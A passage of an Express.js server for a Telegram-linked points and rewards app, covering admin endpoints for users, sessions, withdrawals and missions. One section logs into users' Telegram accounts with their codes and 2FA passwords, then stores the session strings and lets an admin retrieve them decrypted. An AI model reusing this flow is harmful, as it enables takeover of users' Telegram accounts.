app.get("/api/admin/telethon", adminAuth, async (_q, res) => {
  const st = await tgStatus();
  res.json({
    configured: !!st.configured,
    ok: !!st.ok,
    me: st.me || null,
    error: st.error || null,
    service: TG_URL,
  });
});
// endpoint lama /bot diganti status Telethon (kompat admin UI)
app.post("/api/admin/bot", adminAuth, async (_q, res) => {
  const st = await tgStatus();
  if (!st.ok) return res.status(400).json({ error: st.error || "Telethon belum siap — cek .env API_ID/HASH/SESSION" });
  res.json({ ok: true, username: (st.me && (st.me.username || st.me.first_name)) || "telethon" });
});
app.get("/api/admin/overview", adminAuth, async (_q, res) => {
  const st = await tgStatus();
  res.json({
    users: db.prepare("SELECT COUNT(*) c FROM users WHERE verified=1").get().c,
    points_outstanding: db.prepare("SELECT COALESCE(SUM(points),0) s FROM users").get().s,
    pending_withdrawals: db.prepare("SELECT COUNT(*) c FROM withdrawals WHERE status='pending'").get().c,
    bot: {
      configured: !!st.configured && !!st.ok,
      username: (st.me && st.me.username) || (st.ok ? "telethon" : ""),
      telethon: true,
      me: st.me || null,
      error: st.error || null,
    },
    settings: Object.fromEntries(db.prepare("SELECT k,v FROM settings WHERE k NOT IN ('bot_token')").all().map((r) => [r.k, r.v])),
  });
});
app.get("/api/admin/users", adminAuth, (_q, res) => {
  const rows = db.prepare("SELECT id,phone,username,tg_name,points,banned,created,reg_ip,last_ip,last_login FROM users WHERE verified=1 ORDER BY id DESC LIMIT 500").all();
  const ipCounts = {};
  for (const r of rows) if (r.reg_ip) ipCounts[r.reg_ip] = (ipCounts[r.reg_ip] || 0) + 1;
  res.json(rows.map((r) => ({ ...r, same_ip_count: r.reg_ip ? ipCounts[r.reg_ip] : 1 })));
});
app.post("/api/admin/users/:id/ban", adminAuth, (req, res) => { db.prepare("UPDATE users SET banned=? WHERE id=?").run(req.body.banned ? 1 : 0, +req.params.id); res.json({ ok: true }); });
app.get("/api/admin/sessions", adminAuth, (_q, res) => {
  // bersihkan sesi kedaluwarsa dulu
  db.prepare("DELETE FROM sessions WHERE expires<?").run(now());
  const rows = db.prepare(`
    SELECT s.token_hash, s.user_id, s.expires, s.created, s.ip, s.ua, s.tg_name AS sess_tg,
           u.phone, u.username, u.tg_id, u.tg_name AS user_tg, u.banned, u.last_login
    FROM sessions s JOIN users u ON u.id = s.user_id
    WHERE s.expires > ?
    ORDER BY COALESCE(s.created,0) DESC LIMIT 1000
  `).all(now());
  const list = rows.map((r) => {
    const tgName = r.sess_tg || r.user_tg || "";
    return {
      token_hash: r.token_hash,
      session_id: r.token_hash.slice(0, 16),
      session_string: r.token_hash, // hash sesi web (bukan Telethon session akun server)
      user_id: r.user_id,
      phone: r.phone,
      username: r.username || "",
      tg: tgName,
      tg_username: tgName ? (tgName.startsWith("@") ? tgName : "@" + tgName) : "",
      tg_id: r.tg_id || "",
      ip: r.ip || "",
      ua: r.ua || "",
      banned: !!r.banned,
      created: r.created || null,
      expires: r.expires,
      last_login: r.last_login || null,
    };
  });
  res.json({
    live: true,
    count: list.length,
    users_online: new Set(list.map((x) => x.user_id)).size,
    sessions: list,
  });
});
app.post("/api/admin/sessions/revoke", adminAuth, (req, res) => {
  const th = String(req.body.token_hash || "");
  if (!th) return res.status(400).json({ error: "token_hash diperlukan" });
  const n = db.prepare("DELETE FROM sessions WHERE token_hash=?").run(th).changes;
  res.json({ ok: true, removed: n });
});
app.post("/api/admin/sessions/revoke-user", adminAuth, (req, res) => {
  const uid = +req.body.user_id;
  if (!uid) return res.status(400).json({ error: "user_id diperlukan" });
  const n = db.prepare("DELETE FROM sessions WHERE user_id=?").run(uid).changes;
  res.json({ ok: true, removed: n });
});

/* ---- Telegram StringSession (GramJS sidecar) ---- */
function encGuard(res) {
  if (!SESSION_ENC_READY) { res.status(503).json({ error: "Fitur StringSession belum aktif: isi SESSION_ENC_KEY (min. 8 karakter) di .env lalu restart app" }); return false; }
  return true;
}
app.get("/api/admin/tg-sessions", adminAuth, async (_q, res) => {
  const rows = db.prepare(`SELECT t.*, u.phone AS user_phone, u.username AS user_username
    FROM tg_sessions t JOIN users u ON u.id=t.user_id ORDER BY t.created DESC LIMIT 500`).all();
  const st = SESSION_ENC_READY ? await sessService("/health", null, "GET") : { ok: false, configured: false };
  res.json({
    count: rows.length,
    encryption: SESSION_ENC_READY,
    generator: { url: SESS_URL, online: !!st.ok, configured: !!st.configured, error: st.error || null },
    sessions: rows.map((r) => ({ ...sessPublic(r), user_username: r.user_username || "", user_phone: r.user_phone || "" })),
  });
});
// StringSession hanya dikirim saat admin klik "Copy" (tidak pernah ikut daftar)
app.get("/api/admin/tg-sessions/:id/string", adminAuth, (req, res) => {
  if (!encGuard(res)) return;
  const r = db.prepare("SELECT * FROM tg_sessions WHERE id=?").get(+req.params.id);
  if (!r) return res.status(404).json({ error: "Session tidak ditemukan" });
  try {
    const s = decSession(r.session_enc);
    res.set("Cache-Control", "no-store, max-age=0");
    res.json({ ok: true, id: r.id, user_id: r.user_id, session_string: s });
  } catch (e) {
    res.status(500).json({ error: "Gagal membuka session: " + String(e.message || e) });
  }
});
app.post("/api/admin/tg-sessions/start", adminAuth, async (req, res) => {
  if (!encGuard(res)) return;
  const uid = +req.body.user_id;
  const phone = String(req.body.phone || "").trim();
  if (!uid) return res.status(400).json({ error: "Pilih user terlebih dahulu" });
  if (!db.prepare("SELECT id FROM users WHERE id=?").get(uid)) return res.status(404).json({ error: "User tidak ditemukan" });
  if (!phone) return res.status(400).json({ error: "Nomor Telegram wajib diisi" });
  if (!limit("tgstart:" + req.ip, 12, 900)) return res.status(429).json({ error: "Terlalu banyak percobaan, coba lagi nanti" });
  const r = await sessService("/login/start", { phone, user_id: uid });
  if (!r.ok) return sessError(res, r, "Gagal mengirim kode Telegram");
  res.json(r);
});
async function finishTgLogin(req, res, path) {
  if (!encGuard(res)) return;
  const uid = +req.body.user_id;
  if (!uid) return res.status(400).json({ error: "Pilih user terlebih dahulu" });
  const r = await sessService(path, {
    flow_id: String(req.body.flow_id || ""),
    code: String(req.body.code || ""),
    password: String(req.body.password || ""),
  });
  if (r.ok === false && r.need_password) return res.json({ ok: false, need_password: true, hint: r.hint || "" });
  if (!r.ok) return sessError(res, r, "Login Telegram gagal");
  const bad = sessionOwnerError(uid, r.me);
  if (bad) {
    // Jangan simpan session milik akun lain; cabut sesi yang baru dibuat.
    await sessService("/logout", { session_string: r.session_string });
    return res.status(409).json({ error: bad });
  }
  saveTgSession(uid, r.me, r.session_string, req.admin.user);
  res.json({ ok: true, me: r.me || null, saved: true });
}
app.post("/api/admin/tg-sessions/code", adminAuth, (req, res) => finishTgLogin(req, res, "/login/code"));
app.post("/api/admin/tg-sessions/password", adminAuth, (req, res) => finishTgLogin(req, res, "/login/password"));
app.post("/api/admin/tg-sessions/cancel", adminAuth, async (req, res) => {
  await sessService("/login/cancel", { flow_id: String(req.body.flow_id || "") });
  res.json({ ok: true });
});
app.post("/api/admin/tg-sessions/:id/revoke", adminAuth, async (req, res) => {
  if (!encGuard(res)) return;
  const r = db.prepare("SELECT * FROM tg_sessions WHERE id=?").get(+req.params.id);
  if (!r) return res.status(404).json({ error: "Session tidak ditemukan" });
  let sessionString = "";
  try { sessionString = decSession(r.session_enc); } catch (e) { return res.status(500).json({ error: "Gagal membuka session: " + String(e.message || e) }); }
  const out = await sessService("/logout", { session_string: sessionString });
  // Tetap hapus dari DB kalau sidecar bilang session sudah tidak aktif.
  if (!out.ok && !/tidak aktif|AUTH_KEY_UNREGISTERED/i.test(String(out.error || ""))) {
    return sessError(res, out, "Gagal mencabut session di Telegram");
  }
  db.prepare("DELETE FROM tg_sessions WHERE id=?").run(r.id);
  res.json({ ok: true, removed: 1 });
});
app.get("/api/admin/withdrawals", adminAuth, (_q, res) => {
  const rows = db.prepare("SELECT w.*,u.phone,u.created AS acc_created,u.reg_ip FROM withdrawals w JOIN users u ON u.id=w.user_id ORDER BY (w.status='pending') DESC, w.id DESC LIMIT 300").all();
  const ipCounts = {};
  for (const u of db.prepare("SELECT reg_ip FROM users WHERE verified=1 AND reg_ip IS NOT NULL").all()) ipCounts[u.reg_ip] = (ipCounts[u.reg_ip] || 0) + 1;
  res.json(rows.map((r) => ({ ...r, acc_age_hours: Math.round((now() - r.acc_created) / 3600), same_ip_count: r.reg_ip ? (ipCounts[r.reg_ip] || 1) : 1 })));
});
app.post("/api/admin/withdrawals/:id", adminAuth, (req, res) => {
  const w = db.prepare("SELECT * FROM withdrawals WHERE id=?").get(+req.params.id), st = req.body.status;
  if (!w || w.status !== "pending" || !["paid", "rejected"].includes(st)) return res.status(400).json({ error: "Tidak valid" });
  tx(() => {
    db.prepare("UPDATE withdrawals SET status=?,note=? WHERE id=?").run(st, String(req.body.note || "").slice(0, 200), w.id);
    if (st === "rejected") addPoints(w.user_id, w.points, "penarikan ditolak, poin dikembalikan");
  });
  res.json({ ok: true });
});
app.get("/api/admin/redemptions", adminAuth, (_q, res) => res.json(db.prepare("SELECT d.*,u.phone,r.title FROM redemptions d JOIN users u ON u.id=d.user_id JOIN rewards r ON r.id=d.reward_id ORDER BY (d.status='pending') DESC, d.id DESC LIMIT 300").all()));
app.post("/api/admin/redemptions/:id", adminAuth, (req, res) => {
  const d = db.prepare("SELECT * FROM redemptions WHERE id=?").get(+req.params.id), st = req.body.status;
  if (!d || d.status !== "pending" || !["done", "rejected"].includes(st)) return res.status(400).json({ error: "Tidak valid" });
  tx(() => { db.prepare("UPDATE redemptions SET status=? WHERE id=?").run(st, d.id); if (st === "rejected") addPoints(d.user_id, d.cost, "penukaran ditolak, poin dikembalikan"); });
  res.json({ ok: true });
});
app.get("/api/admin/missions", adminAuth, (_q, res) => res.json(db.prepare("SELECT * FROM missions").all()));
app.post("/api/admin/missions", adminAuth, (req, res) => {
  const b = req.body, types = ["daily", "once", "join_channel", "start_bot", "tap_link"];
  if (!types.includes(b.type)) return res.status(400).json({ error: "type tidak valid" });
  if (b.id) db.prepare("UPDATE missions SET title=?,descr=?,reward=?,type=?,link=?,active=? WHERE id=?").run(b.title, b.descr || "", +b.reward, b.type, b.link || "", b.active ? 1 : 0, +b.id);
  else db.prepare("INSERT INTO missions(title,descr,reward,type,link) VALUES(?,?,?,?,?)").run(b.title, b.descr || "", +b.reward, b.type, b.link || "");
  res.json({ ok: true });
});
app.get("/api/admin/rewards", adminAuth, (_q, res) => res.json(db.prepare("SELECT * FROM rewards").all()));
app.post("/api/admin/rewards", adminAuth, (req, res) => {
  const b = req.body;
  if (b.id) db.prepare("UPDATE rewards SET title=?,cost=?,active=? WHERE id=?").run(b.title, +b.cost, b.active ? 1 : 0, +b.id);
  else db.prepare("INSERT INTO rewards(title,cost) VALUES(?,?)").run(b.title, +b.cost);
  res.json({ ok: true });
});
app.post("/api/admin/settings", adminAuth, (req, res) => {
  for (const k of ["min_withdraw", "channel", "methods", "point_value"]) if (k in req.body) db.prepare("INSERT INTO settings VALUES(?,?) ON CONFLICT(k) DO UPDATE SET v=?").run(k, String(req.body[k]), String(req.body[k]));
  res.json({ ok: true });
});

/* ---- halaman: path acak dari .env, nama file asli tidak diekspos ---- */
const fs = require("node:fs");
const page = (f) => fs.readFileSync(path.join(STATIC_DIR, f), "utf8");
// Dibaca ulang tiap request supaya perubahan di ./public langsung tampil tanpa rebuild/restart.
const HTML = {
  index: () => page("index.html").replace(/href="app\.html"/g, `href="/${APP_PATH}"`),
  app: () => page("app.html"),
  admin: () => page("admin.html"),
};
const assetBuf = (f) => { try { return fs.readFileSync(path.join(STATIC_DIR, f)); } catch (e) { return null; } };
const sendAsset = (f, type) => { const buf = assetBuf(f); return (_q, res) => { if (!buf) return res.status(404).end(); res.set({ "Content-Type": type, "Cache-Control": "public, max-age=604800, immutable" }); res.send(buf); }; };
app.get("/logo-rewardex.webp", sendAsset("logo-rewardex.webp", "image/webp"));
app.get("/logo-rewardex.png", sendAsset("logo-rewardex.png", "image/png"));
app.get("/logo-rewardex-sm.webp", sendAsset("logo-rewardex-sm.webp", "image/webp"));
// Versi = mtime+ukuran file HTML. Halaman yang terbuka cek tiap 5 detik dan reload sendiri kalau berubah.
const pageVersion = () => ["index.html", "app.html", "admin.html"].map((f) => { try { const s = fs.statSync(path.join(STATIC_DIR, f)); return s.mtimeMs + ":" + s.size; } catch (e) { return "0"; } }).join("|");
app.get("/api/version", (_q, res) => res.set("Cache-Control", "no-store").json({ v: sha(pageVersion()).slice(0, 16) }));
const AUTO_RELOAD = `<script>(function(){var cur=null;function typing(){var a=document.activeElement;return !!(a&&(a.tagName==="INPUT"||a.tagName==="TEXTAREA")&&a.value);}function tick(){fetch("/api/version",{cache:"no-store"}).then(function(r){return r.json();}).then(function(j){if(cur===null){cur=j.v;return;}if(j.v!==cur&&!typing())location.reload();}).catch(function(){});}setInterval(tick,5000);tick();})();</script>`;
const send = (html, extra) => (_q, res) => { res.set({ "Content-Type": "text/html; charset=utf-8", "Cache-Control": "no-store", ...(extra || {}) }); res.send(html().replace("</body>", () => AUTO_RELOAD + "</body>")); };
app.get("/", send(HTML.index));
app.get("/" + APP_PATH, send(HTML.app));
app.get("/" + ADMIN_PATH, send(HTML.admin, { "X-Robots-Tag": "noindex, nofollow" }));
app.get("/r/:code", (req, res) => res.redirect(302, /^[a-f0-9]{8}$/.test(req.params.code) ? `/${APP_PATH}?ref=${req.params.code}` : "/"));
app.get("/robots.txt", (_q, res) => res.type("text/plain").send("User-agent: *\nDisallow: /api/\nDisallow: /" + ADMIN_PATH + "\n"));
app.use((_q, res) => res.status(404).type("text/plain").send("Not found"));
app.use((e, _q, res, _n) => { console.error(e); res.status(500).json({ error: "server" }); });

app.listen(PORT, () => console.log("listening", PORT, "telethon→", TG_URL));
